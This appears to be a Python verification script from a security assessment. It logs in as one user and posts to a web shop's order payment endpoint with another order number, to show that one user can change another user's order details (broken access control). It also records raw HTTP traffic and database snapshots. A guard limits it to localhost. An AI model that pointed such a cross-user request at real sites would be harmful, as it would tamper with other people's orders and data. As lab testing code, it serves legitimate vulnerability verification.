#!/usr/bin/env python3
"""Independent F-01 verifier. Authorized loopback lab only.

This intentionally does not import or execute the existing PoC. It sends the
request sequence directly and captures raw HTTP + DB snapshots. The reset
command is always attempted in finally once execution begins.
"""
import argparse, datetime as dt, json, os, pathlib, shlex, subprocess, sys, time
from urllib.parse import urlencode
import requests

ALLOWED_HOSTS = {"127.0.0.1", "localhost"}

def die(msg): raise SystemExit(msg)
def run_cmd(cmd, out):
    p = subprocess.run(cmd, shell=True, text=True, stdout=subprocess.PIPE,
                       stderr=subprocess.STDOUT, timeout=120)
    out.write(f"$ {cmd}\n[exit={p.returncode}]\n{p.stdout}\n")
    return p.returncode

def raw_http(label, r, out):
    out.write(f"===== {label} =====\n")
    out.write(f"REQUEST {r.request.method} {r.request.url}\n")
    for k,v in r.request.headers.items(): out.write(f"> {k}: {v}\n")
    body = r.request.body or b""
    if isinstance(body, str): body = body.encode()
    out.write(f"> BODY {len(body)} bytes\n{body.decode('utf-8','replace')}\n")
    out.write(f"RESPONSE HTTP {r.status_code}\n")
    for k,v in r.headers.items(): out.write(f"< {k}: {v}\n")
    out.write(f"< BODY {len(r.content)} bytes\n{r.content.decode('utf-8','replace')}\n\n")

def main():
    ap=argparse.ArgumentParser()
    ap.add_argument('--base', required=True)
    ap.add_argument('--account-a-tel', required=True); ap.add_argument('--account-a-password', required=True)
    ap.add_argument('--account-b-tel', required=True); ap.add_argument('--account-b-password', required=True)
    ap.add_argument('--orderno', required=True)
    ap.add_argument('--db-before-cmd', required=True); ap.add_argument('--db-after-cmd', required=True)
    ap.add_argument('--reset-cmd', required=True)
    ap.add_argument('--outdir', default=os.path.dirname(__file__))
    args=ap.parse_args()
    from urllib.parse import urlparse
    u=urlparse(args.base)
    if u.scheme not in ('http','https') or u.hostname not in ALLOWED_HOSTS:
        die('Refusing non-loopback target; allowed hosts: 127.0.0.1, localhost')
    outdir=pathlib.Path(args.outdir); outdir.mkdir(parents=True, exist_ok=True)
    stamp=dt.datetime.now().strftime('%Y%m%d-%H%M%S')
    raw=outdir/f'raw-{stamp}.txt'; dbb=outdir/f'db-before-{stamp}.txt'; dba=outdir/f'db-after-{stamp}.txt'; reset=outdir/f'reset-{stamp}.txt'; result=outdir/f'result-{stamp}.json'
    base=args.base.rstrip('/')
    s=requests.Session(); outcome={'started':dt.datetime.now().isoformat(),'base':base,'reset_attempted':False}
    try:
        with raw.open('w',encoding='utf-8') as ro:
            ro.write('TARGET GUARD: loopback only\n')
            r=s.post(base+'/index.php/login/index', data={'tel':args.account_b_tel,'password':args.account_b_password,'ajax':'1'}, timeout=15)
            raw_http('LOGIN AS SYNTHETIC B',r,ro); r.raise_for_status()
            login=r.json(); outcome['login']=login
            if login.get('code') != 0: die('synthetic B login failed')
        with dbb.open('w',encoding='utf-8') as f: run_cmd(args.db_before_cmd,f)
        payload={'go':'1','orderno':args.orderno,'username':'INDEPENDENT-F01-B','tel':'17700000002','email':'f01-independent-b@example.test','address':'F01-INDEPENDENT-B-ADDRESS','paytype':'1','ajax':'1'}
        with raw.open('a',encoding='utf-8') as ro:
            r=s.post(base+'/index.php/order/pay', data=payload, timeout=15)
            raw_http('CROSS-USER PAY/ORDER UPDATE',r,ro); r.raise_for_status()
            try: outcome['mutation_response']=r.json()
            except Exception: outcome['mutation_response']=r.text
        with dba.open('w',encoding='utf-8') as f: run_cmd(args.db_after_cmd,f)
        outcome['decision']='REVIEW_DB_AND_RESPONSE'
        outcome['synthetic_marker']='INDEPENDENT-F01-B'
    finally:
        with reset.open('w',encoding='utf-8') as f:
            outcome['reset_attempted']=True
            outcome['reset_exit']=run_cmd(args.reset_cmd,f)
        outcome['finished']=dt.datetime.now().isoformat()
        result.write_text(json.dumps(outcome,ensure_ascii=False,indent=2),encoding='utf-8')
    print(json.dumps(outcome,ensure_ascii=False,indent=2))

if __name__=='__main__': main()
